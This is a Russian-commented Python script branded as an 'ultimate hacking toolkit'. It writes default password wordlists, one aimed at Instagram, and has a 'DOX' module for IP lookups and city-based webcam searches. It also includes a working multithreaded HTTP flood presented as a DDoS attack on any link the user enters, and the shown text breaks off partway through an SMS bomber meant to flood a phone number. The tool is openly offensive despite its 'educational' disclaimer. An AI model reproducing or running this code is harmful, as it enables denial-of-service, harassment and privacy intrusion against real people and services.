import os
import sys
import subprocess
import platform
import json
import time
import random
import string
import hashlib
import re
import requests
import threading
import socket
import smtplib
import webbrowser
from datetime import datetime
import argparse
import math
from fake_useragent import UserAgent
import pyfiglet
from termcolor import colored
from pystyle import Colors, Colorate, Center
from bs4 import BeautifulSoup
from colorama import Fore, init as colorama_init

# Инициализация colorama
colorama_init(autoreset=True)

# ============================================================================
# ПЕРВОНАЧАЛЬНАЯ НАСТРОЙКА ПУТЕЙ
# ============================================================================


def setup_working_directory():
    """Настройка рабочей директории"""
    # Получаем путь к директории скрипта
    if getattr(sys, "frozen", False):
        # Если скрипт запущен как exe
        script_dir = os.path.dirname(sys.executable)
    else:
        # Если скрипт запущен как .py файл
        script_dir = os.path.dirname(os.path.abspath(__file__))

    # Меняем рабочую директорию на директорию скрипта
    os.chdir(script_dir)

    # Создаем необходимые файлы если их нет
    create_necessary_files()

    return script_dir


def create_necessary_files():
    """Создание необходимых файлов если они отсутствуют"""
    files_to_create = {
        "passwords.txt": [
            "password123",
            "123456",
            "qwerty",
            "admin",
            "letmein",
            "welcome",
            "monkey",
            "dragon",
            "12345678",
            "123456789",
            "1234567890",
            "123123",
            "111111",
            "password1",
            "admin123",
        ],
        "pass.txt": [
            "password123",
            "123456",
            "qwerty",
            "instagram",
            "insta123",
            "iloveyou",
            "sunshine",
            "princess",
            "football",
            "baseball",
        ],
    }

    for filename, passwords in files_to_create.items():
        if not os.path.exists(filename):
            print(f"📄 Создаю файл {filename}...")
            with open(filename, "w", encoding="utf-8") as f:
                for password in passwords:
                    f.write(f"{password}\n")
            print(f"✅ Файл {filename} создан")


# ============================================================================
# ИНИЦИАЛИЗАЦИЯ И УСТАНОВКА
# ============================================================================


def clear_screen():
    """Очистка экрана с учетом платформы"""
    os.system("cls" if os.name == "nt" else "clear")


def check_python_version():
    """Проверка версии Python"""
    if sys.version_info < (3, 7):
        print("❌ Требуется Python 3.7 или выше!")
        print(f"🚫 Текущая версия: {platform.python_version()}")
        return False
    return True


def install_dependencies():
    """Автоматическая установка необходимых библиотек"""
    print("🔧 Проверка и установка зависимостей...\n")

    required_libs = {
        "requests": "requests",
        "fake_useragent": "fake-useragent",
        "pyfiglet": "pyfiglet",
        "termcolor": "termcolor",
        "pystyle": "pystyle",
        "colorama": "colorama",
        "beautifulsoup4": "beautifulsoup4",
    }

    import importlib.util

    installed = 0
    failed = []

    print("📦 Установка может занять несколько минут...")
    print("📋 Список библиотек для установки:")
    for lib in required_libs.values():
        print(f"   • {lib}")
    print()

    for display_name, pip_name in required_libs.items():
        try:
            spec = importlib.util.find_spec(display_name)

            if spec is None:
                print(f"📦 Установка {display_name} ({pip_name})...")
                try:
                    # Устанавливаем с помощью pip
                    subprocess.check_call(
                        [sys.executable, "-m", "pip", "install", pip_name],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    print(f"✅ {display_name} успешно установлен")
                    installed += 1
                except subprocess.CalledProcessError:
                    print(f"⚠️  Проблема с установкой {display_name}")
                    try:
                        # Пробуем без подавления вывода
                        subprocess.check_call(
                            [sys.executable, "-m", "pip", "install", pip_name]
                        )
                        print(f"✅ {display_name} установлен")
                        installed += 1
                    except:
                        print(f"❌ Ошибка установки {display_name}")
                        failed.append(display_name)
            else:
                print(f"✅ {display_name} уже установлен")
                installed += 1

            time.sleep(0.3)

        except Exception as e:
            print(f"⚠️  Ошибка при проверке {display_name}: {str(e)[:50]}...")
            failed.append(display_name)

    print(f"\n{'═' * 50}")
    print(f"📊 РЕЗУЛЬТАТ УСТАНОВКИ:")
    print(f"✅ Успешно установлено: {installed}/{len(required_libs)}")

    if failed:
        print(f"❌ Не удалось установить: {len(failed)}")
        print("Список проблемных библиотек:")
        for lib in failed:
            print(f"   - {lib}")
        print(f"\n💡 Рекомендации:")
        print(f"1. Попробуйте установить вручную: pip install {' '.join(failed)}")
        print(f"2. Проверьте подключение к интернету")
        print(f"3. Запустите от имени администратора")
    else:
        print(f"🎉 Все библиотеки успешно установлены!")

    print(f"{'═' * 50}")
    time.sleep(3)

    return len(failed) == 0


# ============================================================================
# КЛАСС УПРАВЛЕНИЯ ЦВЕТАМИ И СТИЛЯМИ
# ============================================================================


class ColorManager:
    """Управление цветами, стилями и анимациями"""

    def __init__(self):
        self.gradient_colors = [
            ["\033[38;2;255;0;255m", "\033[38;2;0;255;255m"],
            ["\033[38;2;255;105;180m", "\033[38;2;135;206;235m"],
            ["\033[38;2;0;255;127m", "\033[38;2;138;43;226m"],
            ["\033[38;2;255;215;0m", "\033[38;2;220;20;60m"],
            ["\033[38;2;64;224;208m", "\033[38;2;255;20;147m"],
        ]

        try:
            from colorama import init, Fore, Back, Style

            init(autoreset=True)
            self.Fore = Fore
            self.Back = Back
            self.Style = Style
            self.colorama_available = True
        except ImportError:
            self.colorama_available = False

            class SimpleColors:
                BLACK = ""
                RED = ""
                GREEN = ""
                YELLOW = ""
                BLUE = ""
                MAGENTA = ""
                CYAN = ""
                WHITE = ""
                RESET = ""
                BRIGHT = ""
                DIM = ""
                UNDERLINE = ""

            self.Fore = SimpleColors()
            self.Style = SimpleColors()
            self.Back = SimpleColors()

    def print_3d_ascii_header(self):
        """Большой 3D ASCII заголовок с градиентом"""
        clear_screen()

        hack_ascii = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗  ██╗  ║
║    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║ ██╔╝  ║
║    ███████║███████║██║     █████╔╝        ██║   ██║   ██║██║   ██║█████╔╝   ║
║    ██╔══██║██╔══██║██║     ██╔═██╗        ██║   ██║   ██║██║   ██║██╔═██╗   ║
║    ██║  ██║██║  ██║╚██████╗██║  ██╗       ██║   ╚██████╔╝╚██████╔╝██║  ██╗  ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝  ║
║                                                                              ║
║    ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗                   ║
║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝                   ║
║       ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║                      ║
║       ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║                      ║
║       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║                      ║
║       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

        lines = hack_ascii.strip("\n").split("\n")

        shadow_offset = 2
        for line in lines:
            shadow_line = " " * shadow_offset + line
            print(f"\033[38;2;40;40;40m{shadow_line}\033[0m")

        cursor_up = f"\033[{len(lines)}A"
        print(cursor_up, end="")

        for i, line in enumerate(lines):
            ratio = i / max(1, len(lines) - 1)

            if i < len(lines) // 3:
                r = 0 + int(100 * ratio)
                g = 255 - int(100 * ratio)
                b = 0 + int(50 * ratio)
            elif i < 2 * len(lines) // 3:
                r = 255
                g = 165 + int(50 * ratio)
                b = 0
            else:
                r = 255 - int(50 * (1 - ratio))
                g = 0
                b = 0

            color_code = f"\033[38;2;{r};{g};{b}m"
            print(f"\033[{i+1};0H{color_code}{line}\033[0m")

        print("\n" * 2)

        self.print_gradient_text("═" * 80)
        self.print_gradient_text(
            "           🔓 SECURITY TOOLKIT v3.5 | ULTIMATE HACKING TOOLKIT          "
        )
        self.print_gradient_text("═" * 80)
        print("\n")

    def print_gradient_text(self, text, color_pair=None):
        """Вывод текста с градиентом"""
        if color_pair is None:
            color_pair = random.choice(self.gradient_colors)

        start_color, end_color = color_pair
        reset = "\033[0m"

        result = ""
        length = len(text)
        for i, char in enumerate(text):
            if char == " ":
                result += char
                continue

            ratio = i / max(1, length - 1)

            try:
                start_rgb = tuple(map(int, start_color[7:-1].split(";")))
                end_rgb = tuple(map(int, end_color[7:-1].split(";")))
            except:
                start_rgb = (255, 0, 255)
                end_rgb = (0, 255, 255)

            r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
            g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
            b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)

            result += f"\033[38;2;{r};{g};{b}m{char}"

        print(result + reset)

    def print_header(self, title, symbol="═"):
        """Вывод заголовка секции с градиентом"""
        width = 78
        border = symbol * width
        centered_title = title.center(width)

        self.print_gradient_text(border)
        self.print_gradient_text(centered_title)
        self.print_gradient_text(border + "\n")

    def print_success(self, message):
        """Вывод успешного сообщения"""
        print(f"\033[38;2;0;255;127m✅ {message}\033[0m")

    def print_error(self, message):
        """Вывод сообщения об ошибке"""
        print(f"\033[38;2;255;69;0m❌ {message}\033[0m")

    def print_warning(self, message):
        """Вывод предупреждения"""
        print(f"\033[38;2;255;215;0m⚠️  {message}\033[0m")

    def print_info(self, message):
        """Вывод информационного сообщения"""
        print(f"\033[38;2;135;206;235mℹ️  {message}\033[0m")

    def print_menu_item(self, number, emoji, description):
        """Вывод элемента меню с градиентом"""
        text = f"[{number}] {emoji} {description}"
        color_pair = random.choice(self.gradient_colors)
        self.print_gradient_text(text, color_pair)

    def animate_text(self, text, delay=0.03, color_pair=None):
        """Анимация вывода текста с градиентом"""
        if color_pair is None:
            color_pair = random.choice(self.gradient_colors)

        start_color, end_color = color_pair
        length = len(text)

        for i, char in enumerate(text):
            if char == " ":
                print(char, end="", flush=True)
                continue

            ratio = i / max(1, length - 1)
            try:
                start_rgb = tuple(map(int, start_color[7:-1].split(";")))
                end_rgb = tuple(map(int, end_color[7:-1].split(";")))
            except:
                start_rgb = (255, 0, 255)
                end_rgb = (0, 255, 255)

            r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
            g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
            b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)

            print(f"\033[38;2;{r};{g};{b}m{char}\033[0m", end="", flush=True)
            time.sleep(delay)
        print()

    def progress_bar(
        self, iteration, total, prefix="", suffix="", length=50, color_pair=None
    ):
        """Отображение прогресс-бара с градиентом"""
        if color_pair is None:
            color_pair = self.gradient_colors[0]

        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)

        bar = ""
        for i in range(length):
            if i < filled_length:
                ratio = i / max(1, length - 1)
                try:
                    start_rgb = tuple(map(int, color_pair[0][7:-1].split(";")))
                    end_rgb = tuple(map(int, color_pair[1][7:-1].split(";")))
                except:
                    start_rgb = (255, 0, 255)
                    end_rgb = (0, 255, 255)
                r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
                g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
                b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)
                bar += f"\033[38;2;{r};{g};{b}m█\033[0m"
            else:
                bar += "░"

        print(f"\r{prefix} |{bar}| {percent}% {suffix}", end="\r")
        if iteration == total:
            print()


# ============================================================================
# DOX МОДУЛЬ (добавлен из dox.py)
# ============================================================================


class DOXModule:
    def __init__(self, color_manager):
        self.color = color_manager
        self.payload = {}
        self.headers = {"x-api-key": "API"}  # Замените на ваш API ключ

    def print_help(self):
        """Вывод помощи по использованию DOX модуля"""
        help_text = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                              ДОКСИНГ ИНСТРУМЕНТЫ                            │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  🎯 ОСНОВНЫЕ КОМАНДЫ:                                                        │
│                                                                              │
│   [-h]                 - Вывод этого сообщения помощи                       │
│   [-ip] <IP адрес>     - Полная информация по IP адресу                     │
│                                                                              │
│  📊 ДОПОЛНИТЕЛЬНЫЕ ОПЦИИ (используются с -ip):                              │
│                                                                              │
│   [-o]                 - Сохранить результат в файл output.txt              │
│   [-S]                 - Показать сводку (Summary) по IP                    │
│   [-V]                 - Проверить использование VPN                        │
│   [-H]                 - Проверить хостинг                                  │
│   [-M]                 - Проверить на наличие вредоносной активности       │
│   [-P]                 - Проверить угрозы приватности                      │
│   [-Safe]              - Проверить безопасность DNS сервера                │
│                                                                              │
│  🌐 СПЕЦИАЛЬНЫЕ ИНСТРУМЕНТЫ:                                                │
│                                                                              │
│   [-CAM] -Country <страна> -City <город>                                    │
│          - Поиск веб-камер в указанном городе                               │
│                                                                              │
│   [-GOOGLEMAPS] -LONG <долгота> -LAT <широта>                              │
│          - Поиск местоположения на Google Maps                              │
│          ⚠️ ВАЖНО: При использовании координат из этого инструмента         │
│            поменяйте долготу и широту местами!                              │
│                                                                              │
│  📝 ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ:                                                  │
│                                                                              │
│   • python hack_toolkit.py --dox -ip 8.8.8.8                               │
│   • python hack_toolkit.py --dox -ip 8.8.8.8 -o -S -V                      │
│   • python hack_toolkit.py --dox -CAM -Country USA -City NewYork           │
│   • python hack_toolkit.py --dox -GOOGLEMAPS -LONG 40.7128 -LAT -74.0060   │
│                                                                              │
│  ⚠️  ПРЕДУПРЕЖДЕНИЕ:                                                        │
│     Этот инструмент предназначен только для образовательных целей           │
│     и тестирования собственных систем. Не используйте для незаконных       │
│     действий или нарушения конфиденциальности других лиц.                   │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
"""
        self.color.animate_text(help_text, delay=0.001)

    def print_banner(self):
        """Печать баннера DOX"""
        banner = """
                               /T /I
                              / |/ | .-~/
                          T\ Y  I  |/  /  _
         /T               | \I  |  I  Y.-~/
        I l   /I       T\ |  |  l  |  T  /
     T\ |  \ Y l  /T   | \I  l   \ `  l Y
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \  ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    " \   7   7   ]
^.___~"--._    ~-{  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l______
       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
              (_/ .  ~(   /'     "~"--,Y   -=b-. _)
               (_/ .  \  :           / l      c"~o \ 
                \ /    `.    .     .^   \_.-~"~--.  )
                 (_/ .   `  /     /       !       )/
                  / / _.   '.   .':      /        '
                  ~(_/ .   /    _  `  .-<_
                    /_/ . ' .-~" `.  / \  \          ,z=.
                    ~( /   '  :   | K   "-.~-.______//
                      "-,.    l   I/ \_    __{--->._(==.
                       //(     \  <    ~"~"     //
                      /' /\     \  \     ,v=.  ((
                    .^. / /\     "  }__ //===-  `
                   / / ' '  "-.,__ {---(==-
                 .^ '       :  T  ~"   ll       
                / .  .  . : | :!        \ 
               (_/  /   | | j-"          ~^
                 ~-<_(_.^-~"
"""
        print(Fore.GREEN + banner)

    def search_cams(self, country, city):
        """Поиск веб-камер по стране и городу"""
        self.color.print_header("📹 ПОИСК ВЕБ-КАМЕР", "━")

        url = f"https://www.criminalip.io/en/asset/search?query=webcam+country%3A+{country}+city%3A+{city}"

        self.color.print_info(f"🌍 Страна: {country}")
        self.color.print_info(f"🏙️ Город: {city}")
        self.color.print_success(f"🔗 Ссылка для поиска камер: {url}")

        # Открываем ссылку в браузере
        webbrowser.open(url)

        return url

    def search_google_maps(self, longitude, latitude):
        """Поиск местоположения на Google Maps"""
        self.color.print_header("🗺️ ПОИСК НА GOOGLE MAPS", "━")

        self.color.print_warning(
            "⚠️ ВАЖНО: При использовании координат из других инструментов"
        )
        self.color.print_warning("поменяйте долготу и широту местами!")

        url = f"https://www.google.com/maps/place/{longitude}+{latitude}/"

        self.color.print_info(f"📍 Долгота: {longitude}")
        self.color.print_info(f"📍 Широта: {latitude}")
        self.color.print_success(f"🔗 Ссылка на Google Maps: {url}")

        # Открываем ссылку в браузере
        webbrowser.open(url)

        return url

    def get_ip_info(self, ip, save_to_file=False, options=None):
        """Получение информации по IP адресу"""
        if options is None:
            options = {}

        self.color.print_header(f"🌐 АНАЛИЗ IP АДРЕСА: {ip}", "━")

        try:
            # 1. WHOIS информация
            self.color.print_info("🔍 Получение WHOIS информации...")
            response = requests.get(f"http://who.is/whois-ip/ip-address/{ip}")
            soup = BeautifulSoup(response.content, "html.parser")
            pre_tag = soup.find("pre")

            if pre_tag:
                whois_info = pre_tag.text.strip()
                print("\n📋 WHOIS ИНФОРМАЦИЯ:")
                print("─" * 60)
                print(whois_info)
            else:
                self.color.print_warning("WHOIS информация не найдена")

            print("\n📍 ГЕОЛОКАЦИЯ:")
            print("─" * 60)
            print(f"🌍 Карта: https://db-ip.com/{ip}")

            # 2. Criminal IP API информация
            self.color.print_info(
                "\n🔍 Запрос расширенной информации через Criminal IP API..."
            )
            url = f"https://api.criminalip.io/v1/ip/data?ip={ip}"

            response = requests.request(
                "GET", url, headers=self.headers, data=self.payload
            )

            if response.status_code == 200:
                json_response = json.loads(response.text)
                print("\n📊 ДЕТАЛЬНАЯ ИНФОРМАЦИЯ:")
                print("─" * 60)
                print(json.dumps(json_response, indent=2))
            else:
                self.color.print_error(f"Ошибка API: {response.status_code}")

            # 3. Дополнительные проверки
            if options.get("summary", False):
                self.get_ip_summary(ip)

            if options.get("vpn", False):
                self.check_vpn(ip)

            if options.get("hosting", False):
                self.check_hosting(ip)

            if options.get("malicious", False):
                self.check_malicious(ip)

            if options.get("privacy", False):
                self.check_privacy_threat(ip)

            if options.get("safe_dns", False):
                self.check_safe_dns(ip)

            # 4. Сохранение в файл если нужно
            if save_to_file:
                self.save_ip_report(
                    ip,
                    whois_info,
                    json_response if "json_response" in locals() else None,
                    options,
                )

        except requests.exceptions.RequestException as e:
            self.color.print_error(f"Ошибка сети: {e}")
        except Exception as e:
            self.color.print_error(f"Ошибка: {e}")

    def get_ip_summary(self, ip):
        """Получение сводки по IP"""
        try:
            url = f"https://api.criminalip.io/v1/ip/summary?ip={ip}"
            response = requests.request(
                "GET", url, headers=self.headers, data=self.payload
            )

            print("\n📈 СВОДКА ПО IP:")
            print("─" * 60)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Ошибка получения сводки: {e}")

    def check_vpn(self, ip):
        """Проверка использования VPN"""
        try:
            url = f"https://api.criminalip.io/v1/ip/vpn?ip={ip}"
            response = requests.request(
                "GET", url, headers=self.headers, data=self.payload
            )

            print("\n🔒 ПРОВЕРКА VPN:")
            print("─" * 60)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Ошибка проверки VPN: {e}")

    def check_hosting(self, ip):
        """Проверка хостинга"""
        try:
            url = f"https://api.criminalip.io/v1/ip/hosting?ip={ip}"
            response = requests.request(
                "GET", url, headers=self.headers, data=self.payload
            )

            print("\n🏢 ПРОВЕРКА ХОСТИНГА:")
            print("─" * 60)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Ошибка проверки хостинга: {e}")

    def check_malicious(self, ip):
        """Проверка на вредоносную активность"""
        try:
            url = f"https://api.criminalip.io/v1/ip/malicious-info?ip={ip}"
            response = requests.request(
                "GET", url, headers=self.headers, data=self.payload
            )

            print("\n⚠️  ПРОВЕРКА НА ВРЕДОНОСНУЮ АКТИВНОСТЬ:")
            print("─" * 60)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Ошибка проверки вредоносной активности: {e}")

    def check_privacy_threat(self, ip):
        """Проверка угроз приватности"""
        try:
            url = f"https://api.criminalip.io/v1/ip/privacy-threat?ip={ip}"
            response = requests.request(
                "GET", url, headers=self.headers, data=self.payload
            )

            print("\n🔐 ПРОВЕРКА УГРОЗ ПРИВАТНОСТИ:")
            print("─" * 60)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Ошибка проверки угроз приватности: {e}")

    def check_safe_dns(self, ip):
        """Проверка безопасного DNS сервера"""
        try:
            url = f"https://api.criminalip.io/v1/ip/is_safe_dns_server?ip={ip}"
            response = requests.request(
                "GET", url, headers=self.headers, data=self.payload
            )

            print("\n🛡️  ПРОВЕРКА БЕЗОПАСНОСТИ DNS:")
            print("─" * 60)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Ошибка проверки DNS безопасности: {e}")

    def save_ip_report(self, ip, whois_info, api_info, options):
        """Сохранение отчета по IP в файл"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"ip_report_{ip}_{timestamp}.txt"

            with open(filename, "w", encoding="utf-8") as file:
                file.write("=" * 80 + "\n")
                file.write(f"ОТЧЕТ ПО IP АДРЕСУ: {ip}\n")
                file.write(
                    f"Дата создания: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                )
                file.write("=" * 80 + "\n\n")

                file.write("1. WHOIS ИНФОРМАЦИЯ:\n")
                file.write("-" * 80 + "\n")
                file.write(whois_info + "\n\n")

                file.write("2. ГЕОЛОКАЦИЯ:\n")
                file.write("-" * 80 + "\n")
                file.write(
                    f"Google Maps: https://www.google.com/maps/search/?api=1&query={ip}\n"
                )
                file.write(f"IP Geolocation: https://db-ip.com/{ip}\n\n")

                if api_info:
                    file.write("3. РАСШИРЕННАЯ ИНФОРМАЦИЯ (Criminal IP API):\n")
                    file.write("-" * 80 + "\n")
                    file.write(json.dumps(api_info, indent=2) + "\n\n")

                if options.get("summary", False):
                    file.write("4. СВОДКА:\n")
                    file.write("-" * 80 + "\n")
                    # Добавить сводку

                file.write("\n" + "=" * 80 + "\n")
                file.write("Отчет создан с помощью DRESSEN Security Toolkit\n")
                file.write("Только для образовательных целей\n")

            self.color.print_success(f"✅ Отчет сохранен в файл: {filename}")

        except Exception as e:
            self.color.print_error(f"❌ Ошибка сохранения отчета: {e}")

    def run_interactive(self):
        """Интерактивный режим DOX модуля"""
        self.color.print_header("🕵️ DOX ИНСТРУМЕНТЫ", "━")

        while True:
            print("\nВыберите действие:\n")

            menu_items = [
                ("🔍", "Информация по IP адресу"),
                ("📹", "Поиск веб-камер по местоположению"),
                ("🗺️", "Поиск на Google Maps по координатам"),
                ("❓", "Показать справку"),
                ("🔙", "Вернуться в главное меню"),
            ]

            for i, (emoji, desc) in enumerate(menu_items, 1):
                self.color.print_menu_item(i, emoji, desc)

            choice = input("\n🎯 Ваш выбор (1-5): ").strip()

            if choice == "1":
                self.ip_info_interactive()
            elif choice == "2":
                self.cam_search_interactive()
            elif choice == "3":
                self.maps_search_interactive()
            elif choice == "4":
                self.print_help()
                input("\n↵ Нажмите Enter для продолжения...")
            elif choice == "5":
                break
            else:
                self.color.print_error("❌ Неверный выбор")

    def ip_info_interactive(self):
        """Интерактивный режим получения информации по IP"""
        self.color.print_header("🌐 ИНФОРМАЦИЯ ПО IP АДРЕСУ", "━")

        ip = input("Введите IP адрес: ").strip()

        if not ip:
            self.color.print_error("IP адрес не введен")
            return

        print("\n📊 Выберите опции (можно несколько через пробел):")
        print("  [1] Сохранить результат в файл")
        print("  [2] Получить сводку (Summary)")
        print("  [3] Проверить VPN")
        print("  [4] Проверить хостинг")
        print("  [5] Проверить на вредоносность")
        print("  [6] Проверить угрозы приватности")
        print("  [7] Проверить безопасность DNS")
        print("  [8] Все опции")
        print("  [9] Только основная информация")

        choice = input("\n🎯 Ваш выбор (например: 1 2 3): ").strip()

        options = {
            "save": "1" in choice or "8" in choice,
            "summary": "2" in choice or "8" in choice,
            "vpn": "3" in choice or "8" in choice,
            "hosting": "4" in choice or "8" in choice,
            "malicious": "5" in choice or "8" in choice,
            "privacy": "6" in choice or "8" in choice,
            "safe_dns": "7" in choice or "8" in choice,
        }

        if choice == "9":
            options = {k: False for k in options}

        self.get_ip_info(ip, save_to_file=options["save"], options=options)
        input("\n↵ Нажмите Enter для продолжения...")

    def cam_search_interactive(self):
        """Интерактивный режим поиска камер"""
        self.color.print_header("📹 ПОИСК ВЕБ-КАМЕР", "━")

        country = input("Введите страну (например: USA): ").strip()
        city = input("Введите город (например: NewYork): ").strip()

        if not country or not city:
            self.color.print_error("Страна и город должны быть указаны")
            return

        self.search_cams(country, city)
        input("\n↵ Нажмите Enter для продолжения...")

    def maps_search_interactive(self):
        """Интерактивный режим поиска на Google Maps"""
        self.color.print_header("🗺️ ПОИСК НА GOOGLE MAPS", "━")

        longitude = input("Введите долготу: ").strip()
        latitude = input("Введите широту: ").strip()

        if not longitude or not latitude:
            self.color.print_error("Долгота и широта должны быть указаны")
            return

        self.search_google_maps(longitude, latitude)
        input("\n↵ Нажмите Enter для продолжения...")

    def run_command_line(self, args):
        """Запуск DOX модуля из командной строки"""
        if "-h" in args or "--help" in args:
            self.print_help()
            return True

        if "-CAM" in args:
            try:
                country_index = args.index("-Country")
                city_index = args.index("-City")
                country = args[country_index + 1]
                city = args[city_index + 1]
                self.search_cams(country, city)
            except (ValueError, IndexError):
                self.color.print_error("Ошибка: укажите страну и город")
            return True

        if "-GOOGLEMAPS" in args:
            try:
                long_index = args.index("-LONG")
                lat_index = args.index("-LAT")
                longitude = args[long_index + 1]
                latitude = args[lat_index + 1]
                self.search_google_maps(longitude, latitude)
            except (ValueError, IndexError):
                self.color.print_error("Ошибка: укажите долготу и широту")
            return True

        if "-ip" in args:
            try:
                ip_index = args.index("-ip")
                ip = args[ip_index + 1]

                options = {
                    "save": "-o" in args,
                    "summary": "-S" in args,
                    "vpn": "-V" in args,
                    "hosting": "-H" in args,
                    "malicious": "-M" in args,
                    "privacy": "-P" in args,
                    "safe_dns": "-Safe" in args,
                }

                self.print_banner()
                self.get_ip_info(ip, save_to_file=options["save"], options=options)
                return True
            except (ValueError, IndexError):
                self.color.print_error("Ошибка: укажите IP адрес после -ip")
                return False

        self.color.print_error("❌ Неверные аргументы. Используйте -h для справки")
        return False

    def run(self):
        """Главный метод запуска DOX модуля"""
        self.color.print_header("🕵️ DOX ИНСТРУМЕНТЫ", "━")

        mode = input(
            "Выберите режим (1 - интерактивный, 2 - командная строка): "
        ).strip()

        if mode == "1":
            self.run_interactive()
        elif mode == "2":
            print("\nВведите команду (например: -ip 8.8.8.8 -o -S)")
            print("Используйте -h для справки")
            cmd = input("> ").strip()
            args = cmd.split()
            self.run_command_line(args)
            input("\n↵ Нажмите Enter для продолжения...")
        else:
            self.color.print_error("Неверный выбор")


# ============================================================================
# DDoS АТАКА (из DDos1.py)
# ============================================================================


class DDoSAttack:
    def __init__(self, color_manager):
        self.color = color_manager
        self.COLOR_CODE = {
            "RESET": "\033[0m",
            "GREEN": "\033[32m",
            "RED": "\033[31m",
        }

    def ddos_attack(self):
        """Запуск DDoS атаки"""
        self.color.print_header("⚡ DDoS АТАКА", "━")

        try:
            link = input(
                Colorate.Horizontal(
                    Colors.green_to_white, "\nВведите ссылку для DDoS атаки: "
                )
            )
            num_threads = int(
                input(
                    Colorate.Horizontal(
                        Colors.green_to_white, "Введите количество потоков: "
                    )
                )
            )
            attack_duration = int(
                input(
                    Colorate.Horizontal(
                        Colors.green_to_white,
                        "Введите длительность атаки (в секундах): ",
                    )
                )
            )

            def send_request(session):
                while time.time() < end_time:
                    try:
                        session.get(link, timeout=5)
                        print(
                            f"{self.COLOR_CODE['GREEN']}Запрос отправлен на {link}{self.COLOR_CODE['RESET']}"
                        )
                    except requests.RequestException:
                        print(
                            f"{self.COLOR_CODE['RED']}Ошибка при отправке запроса на {link}{self.COLOR_CODE['RESET']}"
                        )

            end_time = time.time() + attack_duration
            threads = []
            session = requests.Session()

            self.color.print_info(f"🎯 Начинаю атаку на {link}")
            self.color.print_info(f"📊 Потоков: {num_threads}")
            self.color.print_info(f"⏱️ Длительность: {attack_duration} секунд")

            for i in range(num_threads):
                self.color.progress_bar(
                    i + 1,
                    num_threads,
                    prefix="Создание потоков:",
                    suffix="Готово",
                    length=30,
                )
                time.sleep(0.1)

            print()

            for _ in range(num_threads):
                thread = threading.Thread(target=send_request, args=(session,))
                threads.append(thread)
                thread.start()

            self.color.print_info("🔥 Атака запущена! Ожидайте завершения...")

            attack_progress = 0
            while time.time() < end_time:
                elapsed = attack_duration - (end_time - time.time())
                progress = (elapsed / attack_duration) * 100
                self.color.progress_bar(
                    int(progress),
                    100,
                    prefix="Атака:",
                    suffix=f"{int(elapsed)}/{attack_duration}с",
                    length=40,
                )
                time.sleep(1)

            for thread in threads:
                thread.join()

            print()
            self.color.print_success("DDoS атака завершена")

        except ValueError:
            self.color.print_error("Ошибка: неверный формат числа")
        except Exception as e:
            self.color.print_error(f"Ошибка при запуске атаки: {e}")

        input(f"\n↵ Нажмите Enter для возврата в меню...")

    def run(self):
        """Запуск DDoS атаки"""
        self.ddos_attack()


# ============================================================================
# SMS БОМБЕР (из bomber.py)
# ============================================================================


class SMSBomber:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        """Запуск SMS бомбера"""
        self.color.print_header("💣 SMS БОМБЕР", "━")

        try:
            print("Нажмите Enter чтобы начать...")
            a = input()
            if a != "":
                return

            ascii_banner = pyfiglet.figlet_format("SMS BOMBER")
            print(colored(ascii_banner, color="magenta"))

            number = input("Введите номер телефона: ")

            if not number:
                self.color.print_error("Номер не введен")
                input(f"\n↵ Нажмите Enter для возврата в меню...")
                return

            count = 0
            total_requests = 15

            self.color.print_info("🚀 Начинаю отправку запросов...")

            try:
                for cycle in range(3):
                    user = UserAgent().random
                    headers = {"user-agent": user}

                    requests_list = [
                        (
